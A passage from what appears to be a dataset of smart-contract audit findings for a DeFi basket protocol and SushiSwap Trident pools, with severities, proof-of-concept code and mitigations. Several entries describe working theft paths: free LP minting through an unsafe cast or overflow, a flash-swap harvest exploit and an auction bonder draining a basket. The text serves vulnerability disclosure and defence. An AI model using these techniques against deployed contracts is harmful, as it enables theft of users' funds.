The only way to mitigate it would be to try to front-run the malicious user, obviously not ideal.

#### Proof of Concept

publishAllIndex:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L170>

*   The attacker would listen to this function / PublishedNewIndex event and upon catching it, immediately bond the auction.
*   The publisher has no way to burn a bond before 24h has passed. But even if he could, it would not really help as the attacker could just bond again (though losing funds in the process).

`settleAuction`:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L79>

*   Only the bonder can settle.

`bondBurn`:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Auction.sol#L111>

*   Can only burn 24h after bond.

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

If we only allow one user to bond, I see no real way to mitigate this attack, because the malicious user could always listen to the mempool and immediately bond when an auction starts and thus lock it.

So we can change to a mechanism that allows many people to bond and only one to settle;
but at that point, I see no point to the bond mechanism any more. So we might as well remove it and let anybody settle the auction.

With the bond mechanism, a potential settler would have 2 options:

*   Bond early: no one else will be able to bond and settle, but the user would need to leave more tokens in the basket (as newRatio starts large and decreases in time)
*   Bond late: the settler might make more money as he will need to leave less tokens in the basket, but he risks that somebody else will bond and settle before him.

Without a bond mechanism, the potential settler would still have these equivalent 2 options:

*   Settle early: take from basket less tokens, but make sure you win the auction
*   Settle late: take from basket more tokens, but risk that somebody settles before you

So that's really equivalent to the bonding scenario.

I might be missing something but at the moment I see no detriment to removing the bonding mechanism."
41.md,`Basket.sol#mint()` Malfunction due to extra `nonReentrant` modifier,medium,".

<https://github.com/code-423n4/2021-10-defiprotocol/blob/7ca848f2779e2e64ed0b4756c02f0137ecd73e50/contracts/contracts/Basket.sol#L83-L88>

```solidity
function mint(uint256 amount) public nonReentrant override {
    mintTo(amount, msg.sender);
}

function mintTo(uint256 amount, address to) public nonReentrant override {
    require(auction.auctionOngoing() == false);
```

The `mint()` method is malfunction because of the extra `nonReentrant` modifier, as `mintTo` already has a `nonReentrant` modifier.

#### Recommendation

Change to:

```solidity
function mint(uint256 amount) public override {
    mintTo(amount, msg.sender);
}
```"
41.md,Setting `Factory.auctionDecrement` to zero causes Denial of Service in `Auction.settleAuction()`,medium,".

The function `Factory.setAuctionDecrement()` allows the owner to set the state variable `Factory.auctionDecrement` to zero.

#### Impact

If `Factory.auctionDecrement` equals zero then the function `Auction.settleAuction()` will always revert due to a division by zero:

    uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();

#### Tool Used

Manual code review.

#### Recommended Mitigation Steps

Add an appropriate require statement to the function `Factory.setAuctionDecrement()` to disallow setting `Factory.auctionDecrement` to zero."
41.md,Setting `Factory.bondPercentDiv` to zero cause Denial of Service in `Auction.bondForRebalance()`,medium,".

The function `Factory.setBondPercentDiv()` allows the owner to set the state variable `Factory.bondPercentDiv` to zero.

#### Impact

If `Factory.bondPercentDiv` equals zero then the function `Auction.bondForRebalance()` will always revert due to a division by zero:

    bondAmount = basketToken.totalSupply() / factory.bondPercentDiv();

#### Tool Used

Manual code review.

#### Recommended Mitigation Steps

Add an appropriate require statement to the function `Factory.setBondPercentDiv()` to disallow setting `Factory.bondPercentDiv` to zero."
41.md,Fee on transfer tokens do not work within the protocol,medium,".

Fee on transfer tokens transfer less tokens in than what would be expect.
This means that the protocol request incorrect amounts when dealing with these tokens.

<https://github.com/code-423n4/2021-10-defiprotocol/blob/7ca848f2779e2e64ed0b4756c02f0137ecd73e50/contracts/contracts/Basket.sol#L256>

The protocol should use stored token balances instead of transfer for calculating amounts."
41.md,createBasket re-entrancy,medium,".

#### Impact

function `createBasket` in Factory should also be `nonReentrant` as it interacts with various tokens inside the loop and these tokens may contain callback hooks.

#### Recommended Mitigation Steps

Add `nonReentrant` modifier to the declaration of createBasket."
41.md,Validations,medium,".

#### Impact

function `setBondPercentDiv` should validate that `newBondPercentDiv` is not 0, or `bondForRebalance` will experience division by zero error otherwise. If you want to allow 0 values, then `bondForRebalance` should accommodate for such a possibility.

function `addBounty` should check that `amount > 0` to prevent empty bounties.

function `setMinLicenseFee` should validate that it is not over 100%: `newMinLicenseFee <= BASE`.

function `mintTo` should validate that 'to' is not an empty address (0x0) to prevent accidental loss of tokens.

function `validateWeights` should validate that token is not this `basket erc20: require(\_tokens\[i] != address(this));`

function `proposeBasketLicense` could validate that `tokenName` and `tokenSymbol` are not empty.

function `setBondPercentDiv` should validate that `newBondPercentDiv > 1`, otherwise it may become impossible to `bondBurn` because then `bondAmount = totalSupply` and calculation of newIbRatio will produce division by zero runtime error. Of course, this value is very unlikely but still would be nice to enforce this algorithmically.

#### Recommended Mitigation Steps

Consider applying suggested validations to make the protocol more robust."
41.md,Basket becomes unusable if everybody burns their shares,medium,".

While handling the fees, the contract calculates the new `ibRatio` by dividing by `totalSupply`. This can be 0 leading to a division by 0.

#### Impact

If everybody burns their shares, in the next mint, `totalSupply` will be 0, `handleFees` will revert, and so nobody will be able to use the basket anymore.

#### Proof of Concept

Vulnerable line:
<https://github.com/code-423n4/2021-09-defiProtocol/blob/52b74824c42acbcd64248f68c40128fe3a82caf6/contracts/contracts/Basket.sol#L124>
You can add the following test to Basket.test.js and see that it reverts (..after you remove ""nonReentrant"" from ""mint"", see other issue):
```js
it(""should divide by 0"", async () => {
await basket.connect(addr1).burn(await basket.balanceOf(addr1.address));
await basket.connect(addr2).burn(await basket.balanceOf(addr2.address));
await UNI.connect(addr1).approve(basket.address, ethers.BigNumber.from(1));
await COMP.connect(addr1).approve(basket.address, ethers.BigNumber.from(1));
await AAVE.connect(addr1).approve(basket.address, ethers.BigNumber.from(1));
await basket.connect(addr1).mint(ethers.BigNumber.from(1));
});
```

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

Add a check to `handleFees: if totalSupply= 0`, you can just return, no need to calculate new `ibRatio` / fees.
You might want to reset `ibRatio` to BASE at this point.

[frank-beard (Kuiper) confirmed](https://github.com/code-423n4/2021-10-defiprotocol-findings/issues/49)"
41.md,Auction bonder can steal user funds if bond block is high enough,medium,".

After an auction has started, as time passes and according to the `bondBlock`, `newRatio` (which starts at 2\*ibRatio) gets smaller and smaller and therefore less and less tokens need to remain in the basket.
This is not capped, and after a while, `newRatio` can become smaller than current `ibRatio`.

#### Impact

If for some reason nobody has bonded and settled an auction and the publisher didn't stop it, a malicious user can wait until `newRatio` < `ibRatio`, or even until `newRatio` \~= 0 (for an initial `ibRatio` of \~1e18 this happens after less than 3.5 days after auction started), and then bond and settle and steal user funds.

#### Proof of Concept

These are the vulnerable lines:
<https://github.com/code-423n4/2021-10-defiprotocol/blob/main/contracts/contracts/Auction.sol#L95:#L105>

```solidity
uint256 a = factory.auctionMultiplier() * basket.ibRatio();
uint256 b = (bondBlock - auctionStart) * BASE / factory.auctionDecrement();
uint256 newRatio = a - b;

(address[] memory pendingTokens, uint256[] memory pendingWeights) = basket.getPendingWeights();
IERC20 basketAsERC20 = IERC20(address(basket));

for (uint256 i = 0; i < pendingWeights.length; i++) {
    uint256 tokensNeeded = basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE;
    require(IERC20(pendingTokens[i]).balanceOf(address(basket)) >= tokensNeeded);
}
```

The function verifies that `pendingTokens[i].balanceOf(basket) >= basketAsERC20.totalSupply() * pendingWeights[i] * newRatio / BASE / BASE`. This is the formula that will be used later to mint/burn/withdraw user funds.
As bondBlock increases, newRatio will get smaller, and there is no check on this.
After a while we'll arrive at a point where `newRatio ~= 0`, so `tokensNeeded = newRatio*(...) ~= 0`, so the attacker could withdraw nearly all the tokens using outputTokens and outputWeights, and leave just scraps in the basket.

#### Tools Used

Manual analysis, hardhat.

#### Recommended Mitigation Steps

Your needed condition/math might be different, and you might also choose to burn the bond while you're at it, but I think at the minimum you should add a sanity check in `settleAuction`:
```solidity
require (newRatio > basket.ibRatio());
```

Maybe you would require `newRatio` to be > BASE but not sure."
29.md,Flash swap call back prior to transferring tokens in `indexPool`,high,"#### Impact
In the `IndexPool` contract, `flashSwap` does not work.
The callback function is called prior to token transfer. The sender won't receive tokens in the callBack function.
`ITridentCallee(msg.sender).tridentSwapCallback(context);`

`Flashswap` is not implemented correctly. It may need a migration to redeploy all `indexPools` if the issue is found after main-net launch.
I consider this a high-risk issue.

#### Proof of Concept
[IndexPool.sol#L196-L223](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L196-L223)

```solidity
ITridentCallee(msg.sender).tridentSwapCallback(context);
// @dev Check Trident router has sent `amountIn` for skim into pool.
unchecked { // @dev This is safe from under/overflow - only logged amounts handled.
    require(_balance(tokenIn) >= amountIn + inRecord.reserve, ""NOT_RECEIVED"");
    inRecord.reserve += uint120(amountIn);
    outRecord.reserve -= uint120(amountOut);
}
_transfer(tokenOut, amountOut, recipient, unwrapBento);
```

#### Recommended Mitigation Steps
```solidity
_transfer(tokenOut, amountOut, recipient, unwrapBento);
ITridentCallee(msg.sender).tridentSwapCallback(context);
// @dev Check Trident router has sent `amountIn` for skim into pool.
unchecked { // @dev This is safe from under/overflow - only logged amounts handled.
    require(_balance(tokenIn) >= amountIn + inRecord.reserve, ""NOT_RECEIVED"");
    inRecord.reserve += uint120(amountIn);
    outRecord.reserve -= uint120(amountOut);
}
```"
29.md,Index Pool always swap to Zero,high,"#### Impact
When an Index pool is initiated with two tokens A: B and the weight rate = 1:2, then no user can buy token A with token B.

The root cause is the error in pow. It seems like the dev tries to implement [Exponentiation by squaring](https://en.wikipedia.org/wiki/Exponentiation_by_squaring).
[IndexPool.sol#L286-L291](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L286-L291)

```solidity
function _pow(uint256 a, uint256 n) internal pure returns (uint256 output) {
  output = n % 2 != 0 ? a : BASE;
  for (n /= 2; n != 0; n /= 2) a = a * a;
  if (n % 2 != 0) output = output * a;
}
```

There's no bracket for `for`.

The `IndexPool` is not functional. I consider this is a high-risk issue.

#### Proof of Concept
When we initiated the pool with 2:1.

```python
deployed_code = encode_abi([""address[]"",""uint136[]"",""uint256""], [
    (link.address, dai.address),
    (2*10**18,  10**18),
    10**13
])
```

No one can buy dai with link.

```python"
29.md,`IndexPool` pow overflows when `weightRatio` > 10.,high,"#### Impact
In the `IndexPool` contract, pow is used in calculating price. ([`IndexPool.sol` L255-L266](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L255-L266)).
However, Pow is easy to cause overflow. If the `weightRatio` is large (e.g. 10), there's always overflow.

Lp providers can still provide liquidity to the pool where no one can swap. All pools need to redeploy. I consider this a high-risk issue.

#### Proof of concept
It's easy to trigger this bug by deploying a 1:10 `IndexPool`.

```python
deployed_code = encode_abi([""address[]"",""uint136[]"",""uint256""], [
    (link.address, dai.address),
    (10**18, 10 * 10**18),
    10**13
])
tx_hash = master_deployer.functions.deployPool(index_pool_factory.address, deployed_code).transact()
```

Transactions would be reverted when buying `link` with `dai`.

#### Recommended Mitigation Steps
The `weightRatio` is an 18 decimals number. It should be divided by `(BASE)^exp`. The scale in the contract is not consistent. Recommend the dev to check all the scales/ decimals."
29.md,IndexPool's `INIT_POOL_SUPPLY` is not fair.,high,"#### Impact
The `indexPool` mint `INIT_POOL_SUPPLY` to address 0 in the constructor. However, the value of the burned lp is decided by the first lp provider. According to the formula in [`IndexPool.sol` L106](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L106).

`AmountIn = first_lp_amount / INIT_POOL_SUPPLY` and the burned lp worth = `AmountIn * (INIT_POOL_SUPPLY) / (first_lp_amount + INIT_POOL_SUPPLY)`.
If a pool is not initialized with optimal parameters, it would be a great number of tokens been burn. All lp providers in the pool would receive less profit.

The optimal parameter is `10**8`. It's likely no one would initialize with `10**8` wei in most pools. I consider this is a high-risk issue.

#### Proof of concept
There are two scenarios that the first lp provider can do. The lp provider provides the same amount of token in both cases. However, in the first scenario, he gets about `10 ** 18 * 10**18` lp while in the other scenario he gets `100 * 10**18` lp.

```python
deposit_amount = 10**18
bento.functions.transfer(link.address, admin, pool.address, deposit_amount).transact()
bento.functions.transfer(dai.address, admin, pool.address, deposit_amount).transact()
pool.functions.mint(encode_abi(
    ['address', 'uint256'],
    [admin, 10**8] # minimum
)).transact()
pool.functions.mint(encode_abi(
    ['address', 'uint256'],
    [admin, 10000000000009999 * 10** 20]
)).transact()
```

```python
deposit_amount = 10**18
bento.functions.transfer(link.address, admin, pool.address, deposit_amount).transact()
bento.functions.transfer(dai.address, admin, pool.address, deposit_amount).transact()
pool.functions.mint(encode_abi(
    ['address', 'uint256'],
    [admin, deposit_amount * 100]
)).transact()
```

#### Recommended Mitigation Steps
Recommend to handle `INIT_POOL_SUPPLY` in uniswap-v2's way. Determine an optimized parameter for the user would be a better UX design."
29.md,hybrid pool uses wrong `non_optimal_mint_fee`,high,"#### Impact
When an lp provider deposits an imbalance amount of token, a swap fee is applied. `HybridPool` uses the same `_nonOptimalMintFee` as `constantProductPool`; however, since two pools use different AMM curve, the ideal balance is not the same.  ref: [`StableSwap3Pool.vy` L322-L337](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/3pool/StableSwap3Pool.vy#L322-L337)

Stable swap Pools are designed for 1B+ TVL. Any issue related to pricing/fee is serious. I consider this is a high-risk issue

#### Proof of Concept
- [StableSwap3Pool.vy#L322-L337](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/3pool/StableSwap3Pool.vy#L322-L337)
- [HybridPool.sol#L425-L441](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L425-L441)


#### Recommended Mitigation Steps
Calculate the swapping fee based on the stable swap curve. refer to [StableSwap3Pool.vy#L322-L337](https://github.com/curvefi/curve-contract/blob/master/contracts/pools/3pool/StableSwap3Pool.vy#L322-L337)."
29.md,`IndexPool`:  Poor conversion from Balancer V1's corresponding functions,high,"##### Impact
A number of functions suffer from the erroneous conversion of Balancer V1's implementation.

*   `_compute()` (equivalent to Balancer's [`bpow()`](https://github.com/balancer-labs/balancer-core/blob/master/contracts/BNum.sol#L108-L126))
    *   `if (remain == 0) output = wholePow;` when a return statement should be used instead.
*   `_computeSingleOutGivenPoolIn()` (equivalent to Balancer's [`_calcSingleOutGivenPoolIn()`](https://github.com/balancer-labs/balancer-core/blob/master/contracts/BMath.sol#L195-L224))
    *   `tokenOutRatio` should be calculated with `_compute()` instead of `_pow()`
    *   `zaz` should be calculated with `_mul()` instead of the native `*`
*   `_pow()` (equivalent to Balancer's [`bpowi()`](https://github.com/balancer-labs/balancer-core/blob/master/contracts/BNum.sol#L89-L103))
    *   Missing brackets `{}` for the for loop causes a different interpretation
    *   `_mul` should be used instead of the native `*`

##### Recommended Mitigation Steps
The fixed implementation is provided below.

```jsx
function _computeSingleOutGivenPoolIn(
  uint256 tokenOutBalance,
  uint256 tokenOutWeight,
  uint256 _totalSupply,
  uint256 _totalWeight,
  uint256 toBurn,
  uint256 _swapFee
) internal pure returns (uint256 amountOut) {
    uint256 normalizedWeight = _div(tokenOutWeight, _totalWeight);
    uint256 newPoolSupply = _totalSupply - toBurn;
    uint256 poolRatio = _div(newPoolSupply, _totalSupply);
    uint256 tokenOutRatio = _compute(poolRatio, _div(BASE, normalizedWeight));
    uint256 newBalanceOut = _mul(tokenOutRatio, tokenOutBalance);
    uint256 tokenAmountOutBeforeSwapFee = tokenOutBalance - newBalanceOut;
    uint256 zaz = _mul(BASE - normalizedWeight, _swapFee);
    amountOut = _mul(tokenAmountOutBeforeSwapFee, (BASE - zaz));
}

function _compute(uint256 base, uint256 exp) internal pure returns (uint256 output) {
  require(MIN_POW_BASE <= base && base <= MAX_POW_BASE, ""INVALID_BASE"");

  uint256 whole = (exp / BASE) * BASE;
  uint256 remain = exp - whole;
  uint256 wholePow = _pow(base, whole / BASE);

  if (remain == 0) return wholePow;

  uint256 partialResult = _powApprox(base, remain, POW_PRECISION);
  output = _mul(wholePow, partialResult);
}

function _pow(uint256 a, uint256 n) internal pure returns (uint256 output) {
  output = n % 2 != 0 ? a : BASE;
  for (n /= 2; n != 0; n /= 2) {
		a = _mul(a, a);
    if (n % 2 != 0) output = _mul(output, a);
	}
}
```"
29.md,"`IndexPool.mint` The first liquidity provider is forced to supply assets in the same amount, which may cause a significant amount of fund loss",high,"When `reserve == 0`, `amountIn` for all the tokens will be set to the same amount: `ratio`, regardless of the weights, decimals and market prices of the assets.

The first liquidity provider may not be aware of this so that it may create an arbitrage opportunity for flashbots to take a significant portion of the value of The first liquidity provider's liquidity.


[`IndexPool.sol#L93` L105](https://github.com/sushiswap/trident/blob/6bd4c053b6213ffc612987eb565aa3813d5f0d13/contracts/pool/IndexPool.sol#L93-L105)
```solidity
/// @dev Mints LP tokens - should be called via the router after transferring `bento` tokens.
/// The router must ensure that sufficient LP tokens are minted by using the return value.
function mint(bytes calldata data) public override lock returns (uint256 liquidity) {
    (address recipient, uint256 toMint) = abi.decode(data, (address, uint256));

    uint120 ratio = uint120(_div(toMint, totalSupply));

    for (uint256 i = 0; i < tokens.length; i++) {
        address tokenIn = tokens[i];
        uint120 reserve = records[tokenIn].reserve;
        // @dev If token balance is '0', initialize with `ratio`.
        uint120 amountIn = reserve != 0 ? uint120(_mul(ratio, reserve)) : ratio;
        require(amountIn >= MIN_BALANCE, ""MIN_BALANCE"");
        // @dev Check Trident router has sent `amountIn` for skim into pool.
        unchecked {
            // @dev This is safe from overflow - only logged amounts handled.
            require(_balance(tokenIn) >= amountIn + reserve, ""NOT_RECEIVED"");
            records[tokenIn].reserve += amountIn;
        }
        emit Mint(msg.sender, tokenIn, amountIn, recipient);
    }
    _mint(recipient, toMint);
    liquidity = toMint;
}
```

##### Proof of Concept
Given:

*   A `IndexPool` of 99% USDT and 1% WBTC;
*   Alice is the first liquidity provider.

1.  Alice transfers 1e18 WBTC and 1e18 USDT to mint 100e18 of liquidity;
2.  Bob can use 100e18 USDT (\~\$100) to swap out most of the balance of WBTC.

##### Impact
A significant portion (>90% in the case above) of the user's funds can be lost due to arbitrage.

##### Recommendation
Consider allowing the first liquidity provider to use custom `amountIn` values for each token or always takes the MIN_BALANCE of each token."
29.md,"`HybridPool`'s reserve is converted to ""amount"" twice",high,"The `HybridPool`'s reserves are stored as Bento ""amounts"" (not Bento shares) in `_updateReserves` because `_balance()` converts the current share balance to amount balances.
However, when retrieving the `reserve0/1` storage fields in `_getReserves`, they are converted to amounts a second time.

#### Impact
The `HybridPool` returns wrong reserves which affects all minting/burning and swap functions.
They all return wrong results making the pool eventually economically exploitable or leading to users receiving less tokens than they should.

#### POC
Imagine the current Bento amount / share price being `1.5`.
The pool's Bento *share* balance being `1000`.
`_updateReserves` will store a reserve of `1.5 * 1000 = 1500`.
When anyone trades using the `swap` function, `_getReserves()` is called and multiplies it by `1.5` again, leading to using a reserve of 2250 instead of 1500.
A higher reserve for the output token leads to receiving more tokens as the swap output.
Thus the pool lost tokens and the LPs suffer this loss.

#### Recommended Mitigation Steps
Make sure that the reserves are in the correct amounts."
29.md,Unsafe cast in `IndexPool` mint leads to attack,high,"The `IndexPool.mint` function performs an unsafe cast of `ratio` to the `uint120` type:

```solidity
uint120 ratio = uint120(_div(toMint, totalSupply));
```

Note that `toMint` is chosen by the caller and when choosing `toMint = 2**120 * totalSupply / BASE`, the `ratio` variable will be `2**120` and then truncated to 0 due to the cast.

This allows an attacker to mint LP tokens for free.
They just need to choose the `ratio` such that the `amountIn = ratio * reserve / BASE` variable passes the `require(amountIn >= MIN_BALANCE, ""MIN_BALANCE"");` check.
For example, when choosing `ratio = 2**120 * totalSupply / BASE + 1e16`, an attacker has to pay 1/100th of the current reserves but heavily inflates the LP token supply.

They can then use the inflated LP tokens they received in `burn` to withdraw the entire pool reserves.

#### POC
I created [this POC](https://gist.github.com/MrToph/0c8b6b5ffac0673b2f72412cf4b0b099) that implements a hardhat test and shows how to steal the pool tokens:

#### Impact
An attacker can inflate the LP token pool supply and mint themselves a lot of LP tokens by providing almost no tokens themselves.
The entire pool tokens can be stolen.

#### Recommended Mitigation Steps
Even though Solidity 0.8.x is used, type casts do not throw an error.
A [`SafeCast` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeCast) must be used everywhere a typecast is done."
29.md,`IndexPool` initial LP supply computation is wrong,high,"The `IndexPool.constructor` function already mints `INIT_POOL_SUPPLY = 100 * 1e18 = 1e20` LP tokens to the zero address.

When trying to use the pool, someone has to provide the actual initial reserve tokens in `mint`.
On the first `mint`, the pool reserves are zero and the token amount required to mint is just this `ratio` itself: `uint120 amountIn = reserve != 0 ? uint120(_mul(ratio, reserve)) : ratio;`

Note that the `amountIn` is **independent of the token** which does not make much sense.
This implies that all tokens must be provided in equal ""raw amounts"", regardless of their decimals and value.

#### POC

###### Issue 1

Imagine I want to create a DAI/WBTC pool.
If I want to initialize the pool with 100\$ of DAI, `amountIn = ratio` needs to be `100*1e18=1e20` as DAI has 18 decimals.
However, I now also need to supply `1e20` of WBTC (which has 8 decimals) and I'd need to pay `1e20/1e8 * priceOfBTC`, over a quadrillion dollars to match it with the 100\$ of DAI.

###### Issue 2

Even in a pool where all tokens have the same decimals and the same value, like `USDC <> USDT`, it leads to issues:

*   Initial minter calls `mint` with `toMint = 1e20` which sets `ratio = 1e20 * 1e18 / 1e20 = 1e18` and thus `amountIn = 1e18` as well. The total supply increases to `2e20`.
*   Second minter needs to pay **less** tokens to receive the same amount of `1e18` LP tokens as the first minter. This should never be the case. `toMint = 1e20` => `ratio = 1e20 * 1e18 / 2e20 = 0.5e18`. Then `amountIn = ratio * reserve / 1e18 = 0.5*reserve = 0.5e18`. They only pay half of what the first LP provider had to pay.

#### Impact

It's unclear why it's assumed that the pool's tokens are all in equal value - this is *not* a StableSwap-like pool.

Any pool that uses tokens that don't have the same value and share the same decimals cannot be used because initial liquidity cannot be provided in an economically justifiable way.

It also leads to issues where the second LP supplier has to pay **less tokens** to receive the exact same amount of LP tokens that the initial minter receives. They can steal from the initial LP provider by burning these tokens again.

#### Recommended Mitigation Steps
Do not mint the initial token supply to the zero address in the constructor.

Do it like Uniswap/Balancer and let the first liquidity provider provide arbitrary token amounts, then mint the initial pool supply.
If `reserve == 0`, `amountIn` should just take the pool balances that were transferred to this account.

In case the initial mint to the zero address in the constructor was done to prevent the ""Uniswap-attack"" where the price of a single wei of LP token can be very high and price out LPs, send a small fraction of this initial LP supply (\~1000) to the zero address **after** it was minted to the first supplier in `mint`.

[maxsam4 (Sushi) confirmed](https://github.com/code-423n4/2021-09-sushitrident-findings/issues/78)"
29.md,`ConstantProductPool.burnSingle` swap amount computations should use balance,high,"The `ConstantProductPool.burnSingle` function is basically a `burn` followed by a `swap` and must therefore act the same way as calling these two functions sequentially.

The token amounts to redeem (`amount0`, `amount1`) are computed on the **balance** (not the reserve).
However, the swap amount is then computed on the **reserves** and not the balance.
The `burn` function would have updated the `reserve` to the balances and therefore `balance` should be used here:

```solidity
amount1 += _getAmountOut(amount0, _reserve0 - amount0, _reserve1 - amount1);
```

> ⚠️ The same issue occurs in the `HybridPool.burnSingle`.

#### Impact
For a burn, usually the `reserve` should equal the `balance`, however if any new tokens are sent to the contract and `balance > reserve`, this function will return slightly less swap amounts.

#### Recommended Mitigation Steps
Call `_getAmountOut` with the balances instead of the reserves: `_getAmountOut(amount0, balance0 - amount0, balance1 - amount1)`"
29.md,absolute difference is not calculated properly when a > b in MathUtils,high,"the difference is computed incorrectly when a > b. [`MathUtils.sol` L22](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/libraries/MathUtils.sol#L22)

As it only used in `within1` function, scope narrows down to where `difference(a, b) <= 1;` is exploitable.

cases where `difference(a, b) <= 1` should be true but is reported false:

*   where b = a-1 (returned value is `type(uint256).max`)

cases where `difference(a, b) <= 1` should be false but is reported true:

*   where a = `type(uint256)`.max and b = 0, it returns 1 but it should ideally return `type(uint256).max`

`within1` is used at the following locations:
*   [`HybridPool.sol` L359](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L359)
*   [`HybridPool.sol` L383](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L383)
*   [`HybridPool.sol` L413](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L413)

It is possible to decrease the denominator and increase the value of the numerator (when calculating y) using constants and input to make `within1` fail

Mitigation:

Add `else` condition to mitigate it.
```solidity
unchecked {
    if (a > b) {
        diff = a - b;
    }
    else {
        diff = b - a;
    }
}
```"
29.md,Overflow in the `mint` function of `IndexPool` causes LPs' funds to be stolen,high,"#### Impact
It is possible to overflow the addition in the balance check (i.e., `_balance(tokenIn) >= amountIn + reserve`) in the mint function by setting the `amountIn` to a large amount. As a result, the attacker could gain a large number of LP tokens by not even providing any liquidity. The attacker's liquidity would be much greater than any other LPs, causing him could effectively steal others' funds by burning his liquidity (since the funds he receives are proportional to his liquidity).

#### Proof of Concept
- [mint_overflow.js](https://gist.github.com/x9453/7a423aef223c1b86442206e3248d318c)

Referenced code:
- [IndexPool.sol L110](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L110)

#### Recommended Mitigation Steps
Consider removing the `uncheck` statement to prevent integer overflows from happening."
29.md,Incorrect usage of `_pow` in `_computeSingleOutGivenPoolIn` of `IndexPool`,high,"#### Impact
The `_computeSingleOutGivenPoolIn` function of `IndexPool` uses the `_pow` function to calculate `tokenOutRatio` with the exponent in `WAD` (i.e., in 18 decimals of precision). However, the `_pow` function assumes that the given exponent `n` is not in `WAD`. (for example, `_pow(5, BASE)` returns `5 ** (10 ** 18)` instead of `5 ** 1`). The misuse of the `_pow` function could causes an integer overflow in the `_computeSingleOutGivenPoolIn` function and thus prevent any function from calling it.

#### Proof of Concept
Referenced code:
[IndexPool.sol#L279](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L279)

#### Recommended Mitigation Steps
Change the `_pow` function to the `_compute` function, which supports exponents in `WAD`."
29.md,Incorrect multiplication in `_computeSingleOutGivenPoolIn` of `IndexPool`,high,"#### Impact
The `_computeSingleOutGivenPoolIn` function of `IndexPool` uses the raw multiplication (i.e., `*`) to calculate the `zaz` variable. However, since both `(BASE - normalizedWeight)` and `_swapFee` are in `WAD`, the `_mul` function should be used instead to calculate the correct value of `zaz`. Otherwise, `zaz` would be `10 ** 18` times larger than the expected value and causes an integer underflow when calculating `amountOut`. The incorrect usage of multiplication prevents anyone from calling the function successfully.

#### Proof of Concept
Referenced code:
[IndexPool.sol#L282](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/IndexPool.sol#L282)

#### Recommended Mitigation Steps
Change `(BASE - normalizedWeight) * _swapFee` to `_mul((BASE - normalizedWeight), _swapFee)`."
29.md,Funds in the pool could be stolen by exploiting `flashSwap` in `HybridPool`,high,"#### Impact
An attacker can call the `bento.harvest` function during the callback function of a flash swap of the `HybridPool` to reduce the number of input tokens that he has to pay to the pool, as long as there is any unrealized profit in the strategy contract of the underlying asset.

#### Proof of Concept
1.  The `HybridPool` accounts for the reserve and balance of the pool using the `bento.toAmount` function, which represents the actual amount of assets that the pool owns instead of the relative share. The value of `toAmount` could increase or decrease if the `bento.harvest` function is called (by anyone), depending on whether the strategy contract earns or loses money.
2.  Supposing that the DAI strategy contract of `Bento` has a profit not accounted for yet. To account for the profit, anyone could call `harvest` on `Bento` with the corresponding parameters, which, as a result, increases the `elastic` of the DAI token.
3.  Now, an attacker wants to utilize the unrealized profit to steal funds from a DAI-WETH hybrid pool. He calls `flashSwap` to initiate a flash swap from WETH to DAI. First, the pool transfers the corresponding amount of DAI to him, calls the `tridentSwapCallback` function on the attacker's contract, and expects that enough DAI is received at the end.
4.  During the `tridentSwapCallback` function, the attacker calls `bento.harvest` to realize the profit of DAI. As a result, the pool's `bento.toAmount` increases, and the amount of DAI that the attacker has to pay to the pool is decreased. The attacker could get the same amount of ETH but paying less DAI by exploiting this bug.

Referenced code:
* [`HybridPool.sol` L218-L220](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L218-L220)
* [`HybridPool.sol` L249-L250](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L249-L250)
* [`HybridPool.sol` L272-L285](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/pool/HybridPool.sol#L272-L285)
* [`BentoBoxV1Flat.sol` L1105](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/flat/BentoBoxV1Flat.sol#L1105)
* [`BentoBoxV1Flat.sol` L786-L792](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/flat/BentoBoxV1Flat.sol#L786-L792)
* [`BentoBoxV1Flat.sol` L264-L277](https://github.com/sushiswap/trident/blob/9130b10efaf9c653d74dc7a65bde788ec4b354b5/contracts/flat/BentoBoxV1Flat.sol#L264-L277)

#### Recommended Mitigation Steps
